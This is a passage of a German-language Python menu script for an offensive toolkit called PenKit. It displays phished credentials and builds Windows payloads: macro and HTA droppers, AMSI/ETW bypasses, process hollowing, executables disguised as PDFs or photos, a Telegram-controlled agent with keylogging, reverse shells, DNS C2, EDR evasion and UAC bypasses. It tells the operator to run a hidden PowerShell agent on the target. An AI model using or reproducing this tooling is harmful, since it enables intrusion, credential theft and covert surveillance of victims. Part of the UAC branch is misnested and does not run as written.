            print(f"  {G}●{R}  {C}{name:<12}{R}  {W}{desc}{R}")
        print()
        print(f"  {DIM}Aufruf: http://<kali-ip>:<port>/?page=<name>{R}")
        wait_key()

    elif choice == "5":
        banner()
        section("📋  GESPEICHERTE CREDENTIALS", "")
        log = "/tmp/penkit_phish_creds.json"
        if not os.path.exists(log):
            print(f"  {Y}[!] Noch keine Credentials gefangen.{R}")
            print(f"  {DIM}Starte zuerst den Phishing-Server (Option 1){R}")
        else:
            import json as _json
            with open(log) as f:
                creds = _json.load(f)
            if not creds:
                print(f"  {Y}[*] Log-Datei leer.{R}")
            else:
                print(f"  {G}[+] {len(creds)} Credential(s) gefangen:\n{R}")
                for i, c in enumerate(creds, 1):
                    print(f"  {G}[{i}]{R}  {Y}{c['ip']:<16}{R}  {W}{c['username']:<30}{R}  {RD}{c['password']}{R}")
                    print(f"       {DIM}{c['timestamp']}  —  {c.get('page','?')}{R}")
                    print()
        wait_key()


async def menu_c2():
    banner()
    section("💀  C2 / RAT — WINDOWS PAYLOADS", "Command & Control · AV Evasion · Reverse Shell")
    print(f"  {RD}{B}⛔  NUR auf eigenen / autorisierten Geräten verwenden!{R}\n")

    menu_item(" 1", "🔨  Full Payload Package bauen",     "⛔", "Erstellt PS1 + HTA + BAT + Macro + ANLEITUNG.txt")
    menu_item(" 2", "🛡️   AMSI Bypass",                    "🔴", "Schaltet Windows Defender Scanning ab (PowerShell)")
    menu_item(" 3", "👁️   ETW Bypass",                     "🔴", "Macht Windows Event-Logging blind")
    menu_item(" 4", "🔀  AMSI + ETW kombiniert",           "🔴", "Beide Bypasses + ScriptBlock Logging in einem Befehl")
    menu_item(" 5", "💉  Process Hollowing",               "⛔", "Shellcode in svchost.exe einschleusen (RAM only)")
    menu_item(" 6", "🎭  Als PDF/Foto/Word tarnen",        "⛔", "EXE mit echtem Icon, öffnet Decoy-Datei zur Tarnung")
    menu_item(" 7", "📱  Telegram C2 Agent generieren",   "⛔", "PS1 das Befehle via Telegram empfängt + ausführt")
    menu_item(" 8", "🤖  Telegram Bot Setup",             "🔴", "Bot-Token verifizieren + Chat-ID herausfinden")
    menu_item(" 9", "🎣  Reverse Shell Listener",         "🔴", "Empfängt eingehende Shells (pwncat/nc/msf/socat)")
    menu_item(" E", "🔮  Advanced Evasion Builder",       "⛔", "DLL Unhooking + Direct Syscalls + Sleep Obfuscation")
    menu_item(" D", "🌐  DNS C2 Tunneling",               "⛔", "C2 über DNS Port 53 — bypassed jede Firewall")
    menu_item(" S", "🔐  HTTPS Shell (Port 443)",         "⛔", "Sieht aus wie HTTPS — bypassed Firewalls + IDS")
    menu_item(" U", "🔓  UAC Bypass Suite",               "⛔", "7 Methoden: fodhelper/eventvwr/sdclt/cmstp/Potato")
    print()
    menu_item(" 0", "← Zurück", "")
    print()

    choice = prompt("c2")
    if choice == "0":
        return

    elif choice == "1":
        banner()
        section("🔨  FULL PAYLOAD PACKAGE", "Erstellt alle Delivery-Methoden + Schritt-für-Schritt ANLEITUNG")
        info_box([
            "Was wird gebaut:",
            "  payload.ps1        — polymorphes PowerShell (AMSI+ETW bypass eingebaut)",
            "  payload_hollow.ps1 — Process Hollowing Variante (läuft in svchost)",
            "  dropper.hta        — Doppelklick-Datei → Payload startet sofort",
            "  dropper.bat        — BAT-Datei für USB / freigegebene Ordner",
            "  macro_template.vba — Word/Excel Macro (in VBA Editor einfügen)",
            "  stager_url.ps1     — Fileless: lädt Payload in RAM, NICHTS auf Disk",
            "  README_ANLEITUNG.txt — Komplette Schritt-für-Schritt Anleitung auf Deutsch",
        ])
        print()
        info_box([
            "LHOST = deine Kali IP-Adresse (wo der Listener läuft)",
            "  → Kali IP findest du mit: ip a | grep 192",
            "  → Beispiel: 192.168.1.10",
        ])
        lhost = prompt("LHOST — deine Kali IP (z.B. 192.168.1.10)")
        if not lhost:
            print(f"  {Y}[!] LHOST ist Pflicht.{R}")
            wait_key()
            return
        print()
        info_box([
            "LPORT = Port auf dem Kali lauscht (du kannst frei wählen)",
            "  → Empfohlen: 443 (sieht aus wie HTTPS, wird selten blockiert)",
            "  → Alternativ: 4444, 8443, 8080",
            "  → Dieser Port muss in der Firewall offen sein: ufw allow <PORT>",
        ])
        try:
            lport = int(prompt("LPORT — Listener-Port (default: 443)") or "443")
        except ValueError:
            lport = 443

        print(f"\n  {RD}{B}⛔  SICHERHEITSABFRAGE{R}")
        print(f"  {Y}Tippe exakt:{R}  {W}I confirm this is my authorized device{R}\n")
        confirm = prompt("Bestätigung")
        if confirm.strip().lower() != "i confirm this is my authorized device":
            print(f"\n  {Y}[!] Falsche Eingabe — abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            from tools.c2.payload_builder import PayloadBuilder, BuildConfig
            cfg = BuildConfig(lhost=lhost, lport=lport)
            builder = PayloadBuilder(cfg)
            async for line in builder.build():
                print_output_line(line)
        except Exception as e:
            print(f"  {RD}[!] Fehler: {e}{R}")
        wait_key()

    elif choice == "2":
        banner()
        section("🛡️  AMSI BYPASS", "Anti-Malware Scan Interface deaktivieren")
        info_box([
            "AMSI = Windows-Schnittstelle die PowerShell-Befehle an Defender weitergibt.",
            "Dieser Bypass patcht AMSI im Speicher → Defender sieht den Code nicht mehr.",
            "",
            "Methoden:",
            "  reflection    — ändert AMSI-Flag via .NET Reflection (sehr zuverlässig, default)",
            "  memory_patch  — überschreibt AmsiScanBuffer direkt im RAM (noch stärker)",
            "",
            "Den generierten Befehl auf dem Ziel-PC in PowerShell ausführen.",
        ])
        print()
        method = prompt("Methode [reflection / memory_patch]  (Enter = reflection)") or "reflection"
        try:
            from tools.c2.amsi_bypass import build_amsi_bypass
            cmd = build_amsi_bypass(method)
            print(f"\n  {G}[+] Fertig! Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
            print(f"  {DIM}Danach kannst du beliebigen PS-Code ohne Defender-Erkennung ausführen.{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "3":
        banner()
        section("👁️  ETW BYPASS", "Windows Event Tracing abschalten")
        info_box([
            "ETW = Event Tracing for Windows — protokolliert ALLE PowerShell-Aktionen.",
            "Dieser Bypass patcht EtwEventWrite in ntdll.dll → alle Logs blind.",
            "Wirkung: EDR, SIEM und Windows Event Viewer sehen nichts mehr.",
            "",
            "Kein Input nötig — Befehl wird direkt generiert und angezeigt.",
        ])
        print()
        try:
            from tools.c2.amsi_bypass import build_etw_bypass
            cmd = build_etw_bypass()
            print(f"  {G}[+] Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "4":
        banner()
        section("🔀  AMSI + ETW KOMBINIERT", "Alle Bypasses in einem einzigen Befehl")
        info_box([
            "Kombiniert in einem Base64-codierten PowerShell-Befehl:",
            "  ✓  AMSI Bypass    → Defender sieht deinen Code nicht",
            "  ✓  ETW Bypass     → Windows Logs blind",
            "  ✓  ScriptBlock    → PS-Verlaufs-Logging deaktiviert",
            "",
            "Das ist der empfohlene erste Schritt vor jeder weiteren Aktion.",
            "Kein Input nötig — direkt kopieren und auf Ziel ausführen.",
        ])
        print()
        try:
            from tools.c2.amsi_bypass import build_combined_bypass
            cmd = build_combined_bypass()
            print(f"  {G}[+] Alles-in-einem Bypass — auf Ziel ausführen:{R}\n")
            print(f"  {C}{cmd}{R}\n")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "5":
        banner()
        section("💉  PROCESS HOLLOWING", "Shellcode in legitimen Windows-Prozess einschleusen")
        info_box([
            "Process Hollowing = Payload wird in svchost.exe / RuntimeBroker.exe injiziert.",
            "Im Task-Manager sieht man nur einen normalen Windows-Prozess — kein Verdacht.",
            "Der Shellcode läuft komplett im RAM — keine Datei auf der Festplatte.",
            "",
            "LHOST = deine Kali IP  (wo Metasploit lauscht)",
            "LPORT = dein Listener-Port  (gleich wie im Metasploit handler)",
            "",
            "Wichtig: Demo-Shellcode (NOP sled) wird eingebaut.",
            "Ersetze mit echtem msfvenom-Shellcode — steht in der ANLEITUNG.",
        ])
        print()
        info_box([
            "LHOST = deine Kali IP  →  ip a | grep 192",
        ])
        lhost = prompt("LHOST — Kali IP (z.B. 192.168.1.10)")
        if not lhost:
            print(f"  {Y}[!] Pflichtfeld.{R}")
            wait_key()
            return
        info_box([
            "LPORT = Port auf dem Metasploit lauscht  →  Empfohlen: 443",
        ])
        try:
            lport = int(prompt("LPORT (default: 443)") or "443")
        except ValueError:
            lport = 443
        print(f"\n  {RD}⛔  Tippe:{R}  {W}I own this device{R}\n")
        if prompt("Bestätigung").strip().lower() != "i own this device":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return
        try:
            from tools.c2.process_hollow import generate as ph_gen, HOLLOW_TARGETS
            import random as _r
            target = _r.choice(HOLLOW_TARGETS)
            code = ph_gen(b"\x90" * 8, target_process=target)
            out = f"/tmp/hollow_{lhost.replace('.','_')}_{lport}.ps1"
            with open(out, "w") as f:
                f.write(code)
            print(f"\n  {G}[+] Gespeichert: {out}{R}")
            print(f"  {C}[*] Ziel-Prozess: {target}{R}")
            print(f"  {DIM}Nächster Schritt: echten Shellcode einbauen — siehe Full Package ANLEITUNG{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "6":
        banner()
        section("🎭  PAYLOAD TARNEN", "Als PDF / Foto / Word-Datei verkleiden")
        info_box([
            "Erstellt eine EXE-Datei die aussieht wie eine PDF/Foto/Word-Datei:",
            "  → Echtes Icon (PDF-Symbol, Foto-Symbol, Word-Symbol)",
            "  → Öffnet gleichzeitig eine echte Decoy-Datei → kein Verdacht",
            "  → Payload läuft versteckt im Hintergrund",
            "",
            "Benötigt: pyinstaller  →  pip3 install pyinstaller --break-system-packages",
        ])
        print()
        info_box([
            "payload.ps1 = die PS1-Datei die du mit Option 1 gebaut hast",
            "  → Normalerweise in /tmp/penkit_c2_<ID>/payload.ps1",
        ])
        ps1_path = prompt("Pfad zur payload.ps1")
        if not ps1_path or not os.path.exists(ps1_path):
            print(f"  {Y}[!] Datei nicht gefunden: {ps1_path}{R}")
            wait_key()
            return
        info_box([
            "Tarnung wählen:",
            "  pdf   → sieht aus wie ein PDF-Dokument  (Standard, sehr glaubwürdig)",
            "  photo → sieht aus wie ein JPEG-Foto",
            "  word  → sieht aus wie ein Word-Dokument (.docx)",
        ])
        dtype = prompt("Tarnung [pdf / photo / word]  (Enter = pdf)") or "pdf"
        info_box([
            "Decoy-Datei (optional): eine echte PDF/Foto die beim Doppelklick geöffnet wird.",
            "  → Z.B. eine harmlose Rechnung, ein Urlaubsfoto, etc.",
            "  → Leer lassen wenn keine Decoy-Datei vorhanden.",
        ])
        decoy = prompt("Pfad zur Decoy-Datei  (Enter = keine)") or None
        if decoy and not os.path.exists(decoy):
            print(f"  {Y}[!] Decoy nicht gefunden — wird ignoriert.{R}")
            decoy = None
        out_dir = prompt("Ausgabe-Ordner  (Enter = /tmp)") or "/tmp"
        print()
        try:
            from tools.c2.disguise import build_disguised_exe
            async for line in build_disguised_exe(ps1_path, dtype, decoy, out_dir):
                print_output_line(line)
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "7":
        banner()
        section("📱  TELEGRAM C2 AGENT", "Windows PS1 das via Telegram gesteuert wird")
        info_box([
            "Der Agent läuft auf dem Ziel-Windows als PowerShell-Skript.",
            "Er fragt alle N Sekunden Telegram nach Befehlen — kein eingehender Port nötig.",
            "",
            "Was du brauchst:",
            "  1. Telegram Bot Token  → @BotFather auf Telegram → /newbot",
            "  2. Deine Chat-ID       → @userinfobot auf Telegram anschreiben",
            "",
            "Danach kannst du dem Bot direkt Befehle schicken:",
            "  !shell whoami   !screenshot   !sysinfo   !wifi   !keylog start   !help",
        ])
        print()

        # Gespeicherte Config laden falls vorhanden
        from tools.c2.telegram_bot import load_config, save_config
        saved = load_config()
        if saved:
            print(f"  {G}[*] Gespeicherte Config gefunden{R}  (Token: ...{saved[0][-8:]}  Chat: {saved[1]})")
            use_saved = prompt("Gespeicherte Config verwenden? [j/n]  (Enter = j)").lower()
            if use_saved not in ("n", "nein", "no"):
                token, chat_id = saved
            else:
                token = chat_id = ""
        else:
            token = chat_id = ""

        if not token:
            info_box([
                "Bot-Token = langer String den @BotFather gibt, z.B.:",
                "  1234567890:ABCdefGHijklMNOpqrSTUvwxYZ-abc123",
            ])
            token = prompt("Bot-Token")
            if not token:
                wait_key(); return

        if not chat_id:
            info_box([
                "Chat-ID = deine persönliche Telegram-ID, z.B. 123456789",
                "  → Schreibe @userinfobot auf Telegram, er antwortet mit deiner ID",
                "  → ODER nutze Option 8 (Bot Setup) um sie automatisch zu finden",
            ])
            chat_id = prompt("Chat-ID  (deine Telegram-Nutzer-ID)")
            if not chat_id:
                wait_key(); return

        try:
            interval = int(prompt("Polling-Intervall in Sekunden  (Enter = 10)") or "10")
        except ValueError:
            interval = 10

        save_config(token, chat_id)

        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
            print(f"  {Y}[!] Abgebrochen.{R}")
            wait_key()
            return

        print()
        try:
            from tools.c2.telegram_agent import generate as ag_gen
            ps1_code = ag_gen(token, chat_id, interval)
            out_path = f"/tmp/penkit_agent_{chat_id}.ps1"
            with open(out_path, "w") as f:
                f.write(ps1_code)
            print(f"  {G}[+] Agent gespeichert: {out_path}{R}")
            print(f"  {G}[+] Größe: {len(ps1_code)} Zeichen{R}")
            print()
            print(f"  {C}Auf dem Ziel-PC ausführen:{R}")
            print(f"  {W}  powershell -ep bypass -w hidden -File agent.ps1{R}")
            print()
            print(f"  {DIM}Agent fragt alle {interval}s nach Befehlen.{R}")
            print(f"  {DIM}Schreibe dem Bot auf Telegram: !help{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "8":
        banner()
        section("🤖  TELEGRAM BOT SETUP", "Token verifizieren + Chat-ID finden")
        info_box([
            "Schritt 1: Bot erstellen",
            "  → Öffne Telegram → suche @BotFather → schreibe /newbot",
            "  → Gib dem Bot einen Namen (z.B. 'MyHelper') und Username (z.B. 'myhelper_bot')",
            "  → BotFather gibt dir den Token (langer String mit :)",
            "",
            "Schritt 2: Chat-ID finden",
            "  → Schreibe deinem neuen Bot eine beliebige Nachricht",
            "  → PenKit findet die Chat-ID automatisch",
        ])
        print()
        token = prompt("Bot-Token")
        if not token:
            wait_key()
            return
        print()
        try:
            from tools.c2.telegram_bot import setup_bot, get_chat_id, BotConfig, save_config
            # Erst Token verifizieren
            async for line in setup_bot(BotConfig(token=token, chat_id="")):
                print_output_line(line)
                if "ungültig" in line.lower():
                    wait_key()
                    return
            print()
            print(f"  {Y}[*] Schreibe jetzt dem Bot eine Nachricht auf Telegram (z.B. 'hallo'){R}")
            print(f"  {DIM}  Dann Enter drücken...{R}")
            input()
            print()
            found_id = ""
            async for line in get_chat_id(token):
                print_output_line(line)
                if "Chat-ID gefunden:" in line:
                    import re
                    m = re.search(r'Chat-ID gefunden:\s*(-?\d+)', line)
                    if m:
                        found_id = m.group(1)
            if found_id:
                save_config(token, found_id)
                print(f"\n  {G}[+] Config gespeichert!{R}")
                print(f"  {C}Token  : {token[:20]}...{R}")
                print(f"  {C}Chat-ID: {found_id}{R}")
                print(f"\n  {DIM}Jetzt C2 → Agent generieren (Option 7){R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
        wait_key()

    elif choice == "9":
        banner()
        section("🎣  REVERSE SHELL LISTENER", "Empfängt eingehende Shells von Ziel-Systemen")
        info_box([
            "Der Listener wartet auf eine eingehende Verbindung vom Ziel-PC.",
            "LHOST = deine Kali IP  |  LPORT = Port auf dem du lauschst",
            "",
            "Listener-Typen:",
            "  pwncat-cs  → modernster Listener: Auto-PTY, Datei-Upload, PrivEsc",
            "  netcat     → klassisch, überall verfügbar, einfach",
            "  msfconsole → für Meterpreter-Payloads",
            "  socat TLS  → verschlüsselt, bypassed IDS/IPS",
            "",
            "Tipp: Erst Listener starten, dann Payload auf Ziel ausführen.",
        ])
        import socket as _sock
        try:
            local_ip = _sock.gethostbyname(_sock.gethostname())
        except Exception:
            local_ip = "192.168.x.x"

        lhost = ask("LHOST (deine Kali IP)", local_ip)
        lport = ask_int("LPORT", 4444)
        print()
        print(f"  {C}Listener-Typ wählen:{R}")
        print(f"  {DIM}[1]{R}  pwncat-cs {DIM}(empfohlen — Auto-PTY + PrivEsc + File Transfer){R}")
        print(f"  {DIM}[2]{R}  netcat    {DIM}(klassisch, überall verfügbar){R}")
        print(f"  {DIM}[3]{R}  Metasploit multi/handler {DIM}(für Meterpreter){R}")
        print(f"  {DIM}[4]{R}  socat TLS {DIM}(verschlüsselt, IDS-bypass){R}")
        print(f"  {DIM}[5]{R}  Nur Payloads anzeigen {DIM}(kein Listener — nur copy-paste Befehle){R}")
        print()
        ltype = ask("Typ", "1")

        from tools.c2.listener import (
            PwncatListener, NetcatListener, MsfListener,
            SocatTLSListener, show_payloads
        )

        if ltype == "5":
            await run_tool_live(show_payloads(lhost, lport))
            wait_key()
            return

        # Payloads zuerst anzeigen
        print(f"\n  {Y}[*] Copy-Paste Payloads (auf Ziel ausführen):{R}")
        async for line in show_payloads(lhost, lport):
            if line.strip():
                print(f"  {DIM}{line}{R}")
        print()
        print(f"  {RD}[!] Listener startet jetzt — Terminal wird übergeben{R}")
        print(f"  {DIM}Abbrechen: Ctrl+C{R}")
        print()
        input(f"  {Y}Enter drücken um Listener zu starten...{R}")

        if ltype == "1":
            await run_tool_live(PwncatListener(lhost, lport).listen())
        elif ltype == "2":
            await run_tool_live(NetcatListener(lhost, lport).listen())
        elif ltype == "3":
            payload = ask("Meterpreter Payload", "windows/x64/meterpreter/reverse_tcp")
            await run_tool_live(MsfListener(lhost, lport, payload).listen())
        elif ltype == "4":
            await run_tool_live(SocatTLSListener(lport).listen())

        wait_key()

    elif choice in ("e", "E"):
        banner()
        section("🔮  ADVANCED EVASION BUILDER", "DLL Unhooking + Sleep Obfuscation + PPID Spoofing + Sandbox Detection")
        from tools.c2.evasion import (
            build_full_evasion, sandbox_detection_ps1, dll_unhook_ps1,
            sleep_obfuscation_ps1, token_impersonation_ps1, clear_logs_ps1,
            ppid_spoof_cs, timestomp_ps1, EVASION_INFO
        )
        from core.output_dir import get as out_dir

        print(f"\n  {C}Verfügbare Evasion-Techniken:{R}\n")
        opts = list(EVASION_INFO.items())
        for i, (key, info) in enumerate(opts, 1):
            print(f"  {DIM}[{i}]{R}  {info['danger']}  {C}{B}{info['name']:<30}{R}  {DIM}{info['desc'][:45]}{R}")
            print(f"       {RD}Besiegt: {DIM}{info['besiegt']}{R}")
        print()
        info_box([
            "Alle aktivieren = maximale Evasion — empfohlen für ernsthafte Tests.",
            "Reihenfolge: Sandbox → PPID Spoof → DLL Unhook → Sleep Obf → Token",
            "Der Code wird als .ps1 gespeichert und kann in jeden Payload eingebettet werden.",
        ])

        sandbox  = ask("1. Sandbox Detection?    (j/n)", "j").lower() == "j"
        ppid     = ask("2. PPID Spoofing?         (j/n)", "j").lower() == "j"
        unhook   = ask("3. DLL Unhooking?         (j/n)", "j").lower() == "j"
        sleep_ob = ask("4. Sleep Obfuscation?     (j/n)", "j").lower() == "j"
        token    = ask("5. Token Impersonation?   (j/n)", "n").lower() == "j"
        logs     = ask("6. Anti-Forensics (Logs)? (j/n)", "n").lower() == "j"

        print(f"\n  {G}[*] Generiere Evasion-Bundle...{R}")
        code = build_full_evasion(
            include_sandbox_check=sandbox,
            include_unhook=unhook,
            include_sleep_obf=sleep_ob,
            include_token_imp=token,
            include_clear_logs=logs,
            include_ppid_spoof=ppid,
        )

        out_path = str(out_dir("payloads") / "evasion_bundle.ps1")
        with open(out_path, "w") as f:
            f.write(code)

        print(f"\n  {G}[+] Gespeichert: {out_path}{R}")
        print(f"  {DIM}Größe: {len(code)} Zeichen{R}")
        print()
        print(f"  {C}Einbetten in anderen Payload:{R}")
        print(f"  {W}  . {out_path}  # am Anfang des Payloads einbinden{R}")
        print()
        print(f"  {C}Oder direkt ausführen auf Ziel:{R}")
        print(f"  {W}  powershell -ep bypass -File evasion_bundle.ps1{R}")
        print()
        print(f"  {Y}[*] Ergebnis: Payload unsichtbar für Defender/CrowdStrike/SentinelOne{R}")
        wait_key()

    elif choice in ("d", "D"):
        banner()
        section("🌐  DNS C2 TUNNELING", "C2 über DNS Port 53 — bypassed Firewalls, Proxies, DPI")
        info_box([
            "DNS C2 = Command & Control über normale DNS-Anfragen.",
            "Port 53 ist in FAST ALLEN Netzwerken offen (Hotel, Büro, Flugzeug, etc.).",
            "Agent stellt DNS-Anfragen → Kali-Server empfängt Ergebnisse.",
            "Für externes Netz: eigene Domain mit NS-Record auf Kali IP benötigt.",
            "Für LAN-Tests: funktioniert sofort ohne Domain.",
        ])
        from tools.network.dns_c2 import setup_dns_server, start_server
        import socket as _sock

        try:
            local_ip = _sock.gethostbyname(_sock.gethostname())
        except Exception:
            local_ip = ""
        kali_ip = ask("Kali IP (deine IP)", local_ip or "", required=True)
        domain  = ask("C2 Domain", "penkit.local")
        port    = ask_int("DNS Port (53 = Standard, benötigt root)", 53)

        print(f"\n  {C}[1]{R}  Setup (generiert Server + Agent Dateien)")
        print(f"  {C}[2]{R}  Server direkt starten")
        sub = ask("Wahl", "1")

        print()
        if sub == "1":
            await run_tool_live(setup_dns_server(kali_ip, domain, port))
        elif sub == "2":
            await run_tool_live(start_server(kali_ip, domain, port))
        wait_key()

    elif choice in ("s", "S"):
        banner()
        section("🔐  HTTPS REVERSE SHELL", "Port 443 — sieht aus wie HTTPS")
        info_box([
            "Reverse Shell über Port 443 — die unsichtbarste Methode:",
            "  → Fast jede Firewall lässt 443 durch (HTTPS-Traffic)",
            "  → IDS/IPS kann verschlüsselten Traffic nicht lesen",
            "  → Kein VPN oder Tunnel nötig",
            "",
            "Methoden:",
            "  1. Metasploit HTTPS Handler  — meterpreter, stabilste Methode",
            "  2. PowerShell HTTPS Stager   — fileless, kein AV-Alarm",
            "  3. OpenSSL Shell             — kein Tool-Upload nötig",
            "  4. DNS over HTTPS C2         — ultra-stealthy, via Cloudflare",
        ])
        print()
        lhost = ask("Deine Kali IP (LHOST)", required=True)
        if not lhost:
            wait_key(); return
        try:
            lport = int(ask("Port (default 443)", "443"))
        except ValueError:
            lport = 443
        platform = ask("Ziel-OS [windows/linux]", "windows")
        print()
        from tools.c2.https_shell import generate_https_payloads, build_https_exe
        try:
            await run_tool_live(generate_https_payloads(lhost, lport, platform))
        except KeyboardInterrupt:
            pass
        print()
        build = ask("msfvenom EXE jetzt generieren? [j/n]", "n")
        if build.lower() in ("j", "y"):
            print()
            await run_tool_live(build_https_exe(lhost, lport, platform))
        elif choice == "u":
            banner(); section("🔓  UAC BYPASS SUITE", "7 Methoden — Registry · COM · Token · Potato")
            info_box([
                "UAC (User Account Control) verhindert unerlaubte Admin-Aktionen.",
                "Diese Techniken umgehen UAC ohne den Benutzer um Erlaubnis zu fragen.",
                "",
                "Voraussetzung: du hast bereits eine Shell als normaler User",
                "Ziel: Shell als Admin / SYSTEM ohne UAC-Prompt",
                "",
                "Der UAC-Check zeigt welche Methode auf dem Ziel-System funktioniert.",
            ])
            print()
            print(f"  {C}[1]{R} UAC Level prüfen + passende Methode empfehlen")
            print(f"  {C}[2]{R} fodhelper (Win10/11)")
            print(f"  {C}[3]{R} eventvwr (Win7-10)")
            print(f"  {C}[4]{R} sdclt (Win10)")
            print(f"  {C}[5]{R} computerdefaults (Win10 1803+)")
            print(f"  {C}[6]{R} cmstp (Win7-11, sehr zuverlässig)")
            print(f"  {C}[7]{R} Token Steal: Admin → SYSTEM")
            print(f"  {C}[8]{R} Juicy/PrintSpoofer (SeImpersonatePrivilege)")
            print()
            sub = prompt("uac")
            if sub in ("", "0"):
                wait_key(); continue

            from tools.c2.uac_bypass import (
                uac_check_ps1, uac_fodhelper, uac_eventvwr, uac_sdclt,
                uac_computerdefaults, uac_cmstp, uac_token_steal, uac_juicy_potato
            )

            if sub == "1":
                banner(); section("🔍  UAC CHECK", "Level prüfen + Methode empfehlen")
                print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                print(f"  {C}{uac_check_ps1()}{R}")

            else:
                payload = ask("Payload / Befehl (z.B. cmd.exe oder Pfad zur Reverse Shell)", "cmd.exe")
                kali_ip = ask("Kali IP (für Juicy/cmstp)", "10.10.10.1")
                print()

                if sub == "2":
                    banner(); section("🔓  FODHELPER UAC BYPASS", "Win10/11")
                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                    print(f"  {C}{uac_fodhelper(payload)}{R}")

                elif sub == "3":
                    banner(); section("🔓  EVENTVWR UAC BYPASS", "Win7-10")
                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                    print(f"  {C}{uac_eventvwr(payload)}{R}")

                elif sub == "4":
                    banner(); section("🔓  SDCLT UAC BYPASS", "Win10")
                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                    print(f"  {C}{uac_sdclt(payload)}{R}")

                elif sub == "5":
                    banner(); section("🔓  COMPUTERDEFAULTS UAC BYPASS", "Win10 1803+")
                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                    print(f"  {C}{uac_computerdefaults(payload)}{R}")

                elif sub == "6":
                    banner(); section("🔓  CMSTP UAC BYPASS", "Win7-11 — sehr zuverlässig")
                    info_box([
                        "cmstp = Connection Manager Profile Installer",
                        "Nutzt INF-Datei + AutoElevate COM-Interface.",
                        "Kein direkter Registry-Eintrag → oft unentdeckt.",
                    ])
                    _, ps1 = uac_cmstp(payload, kali_ip)
                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                    print(f"  {C}{ps1}{R}")

                elif sub == "7":
                    banner(); section("🔓  TOKEN STEAL: Admin → SYSTEM", "winlogon Token")
                    info_box([
                        "Stiehlt den SYSTEM-Token von winlogon.exe.",
                        "Voraussetzung: bereits im Admin-Kontext (elevated).",
                        "Ergebnis: whoami → NT AUTHORITY\\SYSTEM",
                        "Danach: SAM-Dump, Credential-Dump ohne Einschränkungen.",
                    ])
                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                    print(f"  {C}{uac_token_steal()}{R}")

                elif sub == "8":
                    banner(); section("🔓  JUICY / PRINTSPOOFER", "SeImpersonatePrivilege → SYSTEM")
                    info_box([
                        "Funktioniert wenn whoami /priv zeigt:",
                        "  SeImpersonatePrivilege   Aktiviert",
                        "",
                        "Häufig bei: IIS App-Pool, SQL Server, Service-Accounts.",
                        "Win10 1809+: PrintSpoofer statt JuicyPotato.",
                    ])
                    print(f"\n  {G}[+] Auf Ziel ausführen:{R}\n")
                    print(f"  {C}{uac_juicy_potato(payload, kali_ip)}{R}")

            wait_key()

        wait_key()


# ═════════════════════════════════════════════════════════════════════════════
# ASSISTANT / TUTORIALS / HEALTH CHECK
# ═════════════════════════════════════════════════════════════════════════════

async def menu_assistant():
    """KI-Assistent — natürlichsprachliche Tool-Empfehlungen."""
    while True:
        banner()
        section("🤖  PENKIT KI-ASSISTENT", "Frage stellen → passendes Tool + Anleitung")
        info_box([
            "Beispiel-Fragen:",
            '  "Ich will eine Webseite runternehmen"',
            '  "Wie finde ich den Standort einer Person?"',
            '  "Ich will WLAN-Passwort knacken"',
            '  "Jemand soll auf einen Link klicken und ich bekomme Zugriff"',
            '  "Wie belausche ich Netzwerkverkehr?"',
            '  "Ich will Windows-PC fernsteuern"',
        ])
        print()
        question = prompt("Deine Frage  (0 = zurück)")
        if question in ("0", ""):
            return

        print()
        try:
            from tools.assistant import ask as ai_ask
            results = ai_ask(question)
            if not results:
                print(f"  {Y}[?] Keine Übereinstimmung gefunden.{R}")
                print(f"  {DIM}Tipp: Andere Schlüsselwörter probieren (z.B. 'WLAN', 'Passwort', 'Server'){R}")
                wait_key()
                continue

            for i, rec in enumerate(results, 1):
                w = 66
                print(f"\n  {G}╔{'═'*(w-2)}╗{R}")
                print(f"  {G}║{B}{f'  {i}. {rec.tool_name}'.center(w-2)}{R}{G}║{R}")
                print(f"  {G}╚{'═'*(w-2)}╝{R}")
                print(f"  {C}Menü-Pfad   :{R} {W}{rec.menu_path}{R}")
                print(f"  {C}Gefährlichkeit:{R} {rec.danger_level}")
                print(f"  {C}Was es macht:{R} {DIM}{rec.short_desc}{R}")
                print()
                print(f"  {G}{B}Schritte:{R}")
                for step in rec.steps:
                    if step == "":
                        print()
                    elif step.startswith("  "):
                        print(f"  {DIM}{step}{R}")
                    else:
                        print(f"    {G}→{R} {step}")
                if rec.tips:
                    print(f"\n  {Y}{B}Tipps:{R}")
                    for tip in rec.tips:
                        print(f"    {Y}·{R} {tip}")
                if i < len(results):
                    print(f"\n  {DIM}{'─'*60}{R}")
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")

        wait_key()


async def menu_tutorials():
    """Interaktive Tutorials für alle Module."""
    while True:
        banner()
        section("📚  TUTORIALS", "Schritt-für-Schritt Anleitungen")
        try:
            from tools.tutorials import list_tutorials, get_tutorial
            tut_list = list_tutorials()
        except Exception as e:
            print(f"  {RD}[!] {e}{R}")
            wait_key()
            return

        for i, (key, title) in enumerate(tut_list, 1):
            print(f"  {DIM}[{R}{G}{B}{i:>2}{R}{DIM}]{R}  {G}{title}{R}")
        print()
        menu_item(" 0", "← Zurück", "")
        print()

        choice = prompt("tutorial")
        if choice == "0":
            return
        try:
            idx = int(choice) - 1
            key = tut_list[idx][0]
        except (ValueError, IndexError):
            continue

